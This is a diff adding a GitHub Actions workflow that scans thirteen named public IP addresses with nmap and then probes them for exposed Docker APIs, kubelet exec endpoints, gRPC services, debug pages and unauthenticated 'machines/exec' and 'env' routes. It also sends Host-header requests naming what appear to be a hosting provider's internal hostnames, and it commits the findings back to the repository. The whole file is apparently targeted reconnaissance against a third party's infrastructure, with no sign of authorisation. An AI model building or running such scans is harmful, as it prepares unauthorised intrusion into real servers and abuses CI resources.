@@ -1,0 +1,140 @@
+name: supscan
+on: [push, workflow_dispatch]
+permissions:
+  contents: write
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+      - name: install
+        run: |
+          sudo apt-get update -qq >/dev/null 2>&1 || true
+          sudo apt-get install -y -qq nmap curl netcat-openbsd openssl >/dev/null 2>&1 || true
+          (curl -sSL -m 60 https://github.com/fullstorydev/grpcurl/releases/download/v1.9.1/grpcurl_1.9.1_linux_x86_64.tar.gz | tar -xz grpcurl) 2>/dev/null || true
+          ls -la grpcurl 2>/dev/null || echo "no grpcurl"
+      - name: fullscan
+        run: |
+          mkdir -p results
+          IPS="176.9.48.219 142.132.195.252 167.235.8.251 91.98.185.219 49.12.82.59 116.202.230.58 167.235.182.121 162.55.99.187 157.90.32.52 195.201.56.246 46.224.107.160 188.245.50.67 116.202.6.71"
+          for ip in $IPS; do
+            ( sudo nmap -sS -p- -T4 --min-rate 3000 -Pn -n --open $ip -oN results/full_$ip.nmap >/dev/null 2>&1; echo "DONE $ip" ) &
+          done
+          wait
+          for ip in $IPS; do
+            P=$(grep -oE '^[0-9]+/tcp +open' results/full_$ip.nmap 2>/dev/null | cut -d/ -f1 | paste -sd, -)
+            echo "OPEN $ip => ${P:-NONE}"
+          done | tee results/open_summary.txt
+      - name: version
+        run: |
+          IPS=$(awk '{print $2}' results/open_summary.txt)
+          for ip in $IPS; do
+            P=$(grep "^OPEN $ip " results/open_summary.txt | sed 's/.*=> //')
+            [ "$P" = "NONE" ] && continue
+            ( timeout 240 sudo nmap -sV -Pn -n -p $P --version-intensity 7 --script=banner $ip -oN results/sv_$ip.nmap >/dev/null 2>&1; echo "SVDONE $ip" ) &
+          done
+          wait
+          echo ===SERVICEVERSION=== | tee results/sv_summary.txt
+          for f in results/sv_*.nmap; do echo "--- $f ---"; grep -E '^[0-9]+/tcp' $f; done | tee -a results/sv_summary.txt
+      - name: probe
+        run: |
+          cat > x.py <<'PY'
+          import subprocess, os, json, re
+          LOG=open('results/probe.log','w')
+          def log(x):
+              print(x); LOG.write(str(x)+'\n'); LOG.flush()
+          def run(cmd,timeout=20):
+              try:
+                  r=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=timeout)
+                  return (r.stdout+r.stderr).strip()
+              except Exception as ex:
+                  return 'TIMEOUT/ERR '+repr(ex)
+          sups=['176.9.48.219','142.132.195.252','167.235.8.251','91.98.185.219','49.12.82.59','116.202.230.58','167.235.182.121','162.55.99.187','157.90.32.52','195.201.56.246']
+          gws=['46.224.107.160','188.245.50.67']
+          allips=sups+gws
+          # parse open ports
+          op={}
+          for ip in allips+['116.202.6.71']:
+              p='results/full_%s.nmap'%ip
+              if os.path.exists(p):
+                  s=open(p,errors='ignore').read()
+                  op[ip]=sorted(set(int(m) for m in re.findall(r'^(\d+)/tcp\s+open',s,re.M)))
+              else: op[ip]=[]
+          open('results/ports.json','w').write(json.dumps(op))
+          log('PORTS '+json.dumps(op))
+          # banner grab 22 / 22222
+          for ip in allips:
+              for port in [22,22222,2222,22022]:
+                  if port in op[ip]:
+                      log('BANNER %s:%d => %r'%(ip,port,run("timeout 5 nc -w4 %s %d </dev/null | head -c 200"%(ip,port),10)))
+          # service-specific probes
+          for ip in allips:
+              for p in op[ip]:
+                  if p in (2375,):
+                      for path in ['/version','/containers/json','/images/json','/info']:
+                          log('DOCKER %s:%d%s => %r'%(ip,p,path,run("curl -sS -m 6 --max-time 7 '%s' | head -c 1200"%( 'http://%s:%d%s'%(ip,p,path)),12)))
+                  if p in (2376,):
+                      for path in ['/version','/containers/json']:
+                          log('DOCKER-TLS %s:%d%s => %r'%(ip,p,path,run("curl -skS -m 6 --max-time 7 'https://%s:%d%s' | head -c 1200"%(ip,p,path),12)))
+                  if p == 10250:
+                      for path in ['/pods','/metrics','/healthz','/logs/','/exec/','/run/']:
+                          log('KUBELET %s:%d%s => %r'%(ip,p,path,run("curl -skS -m 6 --max-time 7 'https://%s:%d%s' | head -c 900"%(ip,p,path),12)))
+                  if p == 10255:
+                      for path in ['/pods','/healthz','/metrics']:
+                          log('KUBELETRO %s:%d%s => %r'%(ip,p,path,run("curl -sS -m 6 --max-time 7 'http://%s:%d%s' | head -c 900"%(ip,p,path),12)))
+                  if p in (9090,9091,9092,9093,3000,4000,8000,8080,8081,9000,9001,10033,5000,5001,8443,9999,8082,8888,7000,7001,7002,9110,9094):
+                      for path in ['/','/health','/healthz','/metrics','/-/healthy','/api/v1/targets','/version','/v2/','/v2/_catalog','/debug/pprof/']:
+                          for scheme in ['http','https']:
+                              o=run("curl -skS -m 5 --max-time 6 '%s://%s:%d%s' | head -c 600"%(scheme,ip,p,path),10)
+                              if any(k in o for k in ['Connection refused','timed out','TIMEOUT','Empty reply','SSL_ERROR','could not connect','Failed to connect','no peer certificate']): continue
+                              log('HTTP %s://%s:%d%s => %r'%(scheme,ip,p,path,o))
+                  # grpc
+                  if p in (50051,443,5001,10033):
+                      for mode in ['-plaintext','-insecure']:
+                          o=run("timeout 15 ./grpcurl %s %s:%d list 2>&1 | head -c 1200"%(mode,ip,p),20)
+                          log('GRPC %s %s:%d => %r'%(mode,ip,p,o))
+          # supervisor 443 route oracle (no-auth status codes)
+          paths=['/health','/version','/metrics','/machines','/machines/1','/machines/1/exec','/machines/1/logs','/machines/1/containers','/machines/1/services','/machines/1/env','/machines/1/stop','/services','/deploy','/build','/proxy','/v1','/v1/machines','/v1/health','/api','/api/v1/machines','/debug/pprof/','/config','/agent/machines']
+          for ip in sups:
+              for path in paths:
+                  base='https://%s:443%s'%(ip,path)
+                  o=run("curl -skS -m 6 --max-time 7 -o /dev/null -w '%%{http_code}' '%s'"%base,10)
+                  log('SUP %s %s => %s'%(ip,path,o))
+          # gateway 443 route oracle
+          for ip in gws:
+              for path in ['/health','/version','/metrics','/machines','/services','/deploy','/proxy','/v1','/api','/debug/pprof/','/config','/routes','/upstreams','/sni','/hosts','/status']:
+                  o=run("curl -skS -m 6 --max-time 7 -o /dev/null -w '%%{http_code}' 'https://%s%s'"%(ip,path),10)
+                  log('GW %s %s => %s'%(ip,path,o))
+          LOG.close()
+          PY
+          python3 x.py 2>&1 | tail -200
+          ls -la results
+      - name: port10033
+        run: |
+          mkdir -p results
+          IP=116.202.6.71
+          for port in 10033 32768 51191; do
+            echo "===== $IP:$port =====" | tee -a results/p10033.log
+            echo "--- openssl ---" | tee -a results/p10033.log
+            timeout 15 openssl s_client -connect $IP:$port -servername admin-prod.sliplane.app </dev/null 2>&1 | grep -E 'subject=|issuer=|Protocol|Cipher|Verify return|CONNECTED' | tee -a results/p10033.log
+            for h in admin-prod.sliplane.app app-staging.sliplane.app docs.sliplane.app events.sliplane.app lutra.sliplane.app frontend-prod.sliplane.app supervisor-01.fsn1.ger.sliplane.io registry-01.nbg1.ger.sliplane.io localhost; do
+              for path in / /health /healthz /metrics /version /api /v1 /v2/ /debug/pprof/; do
+                o=$(curl -skS -m 6 -i --max-time 7 -H "Host: $h" "https://$IP:$port$path" | head -c 500)
+                case "$o" in *"Connection refused"*|*"timed out"*|*"Empty reply"*|*"SSL"*) continue;; esac
+                echo "HOST $h PATH $path => $o" | tee -a results/p10033.log
+              done
+            done
+            for h in admin-prod.sliplane.app app-staging.sliplane.app supervisor-01.fsn1.ger.sliplane.io; do
+              o=$(curl -sS -m 6 -i --max-time 7 -H "Host: $h" "http://$IP:$port/" | head -c 400)
+              case "$o" in *"Connection refused"*|*"timed out"*|*"Empty reply"*) continue;; esac
+              echo "PLAIN-$h => $o" | tee -a results/p10033.log
+            done
+          done
+      - name: commit
+        if: always()
+        run: |
+          git config user.name probe; git config user.email probe@users.noreply.github.com
+          git add -A results || true
+          git commit -m "i13880 supscan $(date -u +%s)" || true
+          for i in 1 2 3 4 5 6; do git pull --rebase origin main >/dev/null 2>&1 || true; git push && break; sleep 6; done || true
